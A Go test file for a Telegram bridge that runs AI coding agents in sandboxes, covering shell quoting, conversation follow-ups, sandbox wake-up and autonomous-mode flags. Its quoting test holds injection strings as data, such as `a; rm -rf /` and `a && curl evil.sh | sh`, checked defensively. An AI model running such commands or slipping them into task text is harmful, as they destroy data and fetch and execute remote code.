package telegram

import (
	"context"
	"errors"
	"strings"
	"testing"

	rt "github.com/pilldrops-oss/pilldrops/internal/runtime"
)

// Task text lands inside a shell command, so quotes must not break it and substitutions must not execute.
func TestSubstituteTaskIsShellSafe(t *testing.T) {
	for _, task := range []string{
		`don't delete the file`,
		`say "hello"`,
		`run $(whoami)`,
		"use `id` please",
		`a; rm -rf /`,
		`a && curl evil.sh | sh`,
		"multi\nline",
		`back\slash`,
		`'quoted'`,
	} {
		got := substituteTask(`claude -p "{task}"`, task)
		if strings.Contains(got, `"{task}"`) || strings.Contains(got, "{task}") {
			t.Errorf("placeholder survived for %q: %s", task, got)
		}
		// Everything after the binary must be one single-quoted literal.
		args := strings.TrimPrefix(got, "claude -p ")
		if !strings.HasPrefix(args, "'") || !strings.HasSuffix(args, "'") {
			t.Errorf("task not single-quoted for %q: %s", task, got)
		}
		// The only ' inside must be part of the '\'' escape sequence.
		inner := args[1 : len(args)-1]
		if strings.Contains(strings.ReplaceAll(inner, `'\''`, ""), "'") {
			t.Errorf("unescaped quote can close the literal for %q: %s", task, got)
		}
	}
}

func TestShellQuoteRoundTrip(t *testing.T) {
	for _, s := range []string{"plain", `it's`, `"x"`, `a'b'c`, "", "a\nb"} {
		q := shellQuote(s)
		// Strip the outer quotes and undo the '\'' escape.
		inner := q[1 : len(q)-1]
		got := strings.ReplaceAll(inner, `'\''`, "'")
		if got != s {
			t.Errorf("round trip of %q gave %q (quoted: %s)", s, got, q)
		}
	}
}

func TestAgentCommandUsesContinueOnFollowUp(t *testing.T) {
	first, err := AgentCommand("claude", "do a thing", RunOpts{})
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(first, "--continue") {
		t.Errorf("first message continued a conversation that does not exist: %s", first)
	}

	next, err := AgentCommand("claude", "and now this", RunOpts{FollowUp: true})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(next, "--continue") {
		t.Errorf("follow-up did not continue the conversation: %s", next)
	}
}

func TestAgentCommandFallsBackWhenNoContinue(t *testing.T) {
	got, err := AgentCommand("amp", "task", RunOpts{FollowUp: true})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(got, "amp ") {
		t.Errorf("unexpected command: %s", got)
	}
}

func TestAgentCommandRejectsNonAgentTemplate(t *testing.T) {
	if _, err := AgentCommand("base", "task", RunOpts{}); err == nil {
		t.Error("a non-agent template was accepted as chat-capable")
	}
	if _, err := AgentCommand("no-such-template", "task", RunOpts{}); err == nil {
		t.Error("an unknown template was accepted")
	}
}

type fakeBoxes struct {
	state     SandboxState
	exists    bool
	resumed   int
	resumeErr error
	res       rt.ExecResult
	execErr   error
	gotCmd    string
}

func (f *fakeBoxes) Get(string) (SandboxState, bool) { return f.state, f.exists }
func (f *fakeBoxes) Resume(context.Context, string) error {
	f.resumed++
	if f.resumeErr != nil {
		return f.resumeErr
	}
	f.state.Paused = false
	return nil
}
func (f *fakeBoxes) Exec(_ context.Context, _ string, spec rt.ExecSpec) (rt.ExecResult, error) {
	f.gotCmd = spec.Cmd
	return f.res, f.execErr
}

func TestRunnerWakesPausedWorkstation(t *testing.T) {
	boxes := &fakeBoxes{
		state:  SandboxState{Template: "claude", Paused: true},
		exists: true,
		res:    rt.ExecResult{Stdout: "all done"},
	}
	r := &DaemonRunner{Boxes: boxes}

	out, err := r.Run(context.Background(), "sb_1", "fix it", RunOpts{})
	if err != nil {
		t.Fatalf("run: %v", err)
	}
	if boxes.resumed != 1 {
		t.Errorf("resumed %d times, want 1", boxes.resumed)
	}
	if out != "all done" {
		t.Errorf("output = %q", out)
	}
	if !strings.Contains(boxes.gotCmd, "claude") {
		t.Errorf("did not invoke the agent: %s", boxes.gotCmd)
	}
}

func TestRunnerSkipsResumeWhenRunning(t *testing.T) {
	boxes := &fakeBoxes{
		state:  SandboxState{Template: "claude", Paused: false},
		exists: true,
		res:    rt.ExecResult{Stdout: "ok"},
	}
	r := &DaemonRunner{Boxes: boxes}
	if _, err := r.Run(context.Background(), "sb_1", "task", RunOpts{}); err != nil {
		t.Fatal(err)
	}
	if boxes.resumed != 0 {
		t.Errorf("resumed a running workstation %d times", boxes.resumed)
	}
}

func TestRunnerSurfacesStderrOnFailure(t *testing.T) {
	boxes := &fakeBoxes{
		state:  SandboxState{Template: "claude"},
		exists: true,
		res:    rt.ExecResult{ExitCode: 1, Stderr: "ANTHROPIC_API_KEY is not set"},
	}
	r := &DaemonRunner{Boxes: boxes}
	_, err := r.Run(context.Background(), "sb_1", "task", RunOpts{})
	if err == nil || !strings.Contains(err.Error(), "ANTHROPIC_API_KEY") {
		t.Errorf("error = %v, want the agent's own explanation", err)
	}
}

func TestRunnerMissingSandbox(t *testing.T) {
	r := &DaemonRunner{Boxes: &fakeBoxes{exists: false}}
	_, err := r.Run(context.Background(), "gone", "task", RunOpts{})
	if err == nil || !strings.Contains(err.Error(), "no longer exists") {
		t.Errorf("error = %v, want a clear 'link a new one' message", err)
	}
}

func TestRunnerResumeFailureIsReported(t *testing.T) {
	boxes := &fakeBoxes{
		state: SandboxState{Template: "claude", Paused: true}, exists: true,
		resumeErr: errors.New("no capacity"),
	}
	r := &DaemonRunner{Boxes: boxes}
	_, err := r.Run(context.Background(), "sb_1", "task", RunOpts{})
	if err == nil || !strings.Contains(err.Error(), "wake") {
		t.Errorf("error = %v, want a wake failure", err)
	}
}

// Claude Code refuses --dangerously-skip-permissions as root unless IS_SANDBOX=1.
func TestAutonomousCarriesRequiredEnv(t *testing.T) {
	auto, err := AgentCommand("claude", "do it", RunOpts{Autonomous: true})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(auto, "IS_SANDBOX=1 ") {
		t.Errorf("autonomous command lacks the env its own flag requires: %s", auto)
	}
	if !strings.Contains(auto, "--dangerously-skip-permissions") {
		t.Errorf("autonomy flag missing: %s", auto)
	}
	// Only alongside the flag, never on a non-autonomous run.
	plain, err := AgentCommand("claude", "do it", RunOpts{})
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(plain, "IS_SANDBOX") {
		t.Errorf("non-autonomous run asserted sandbox privileges: %s", plain)
	}
}
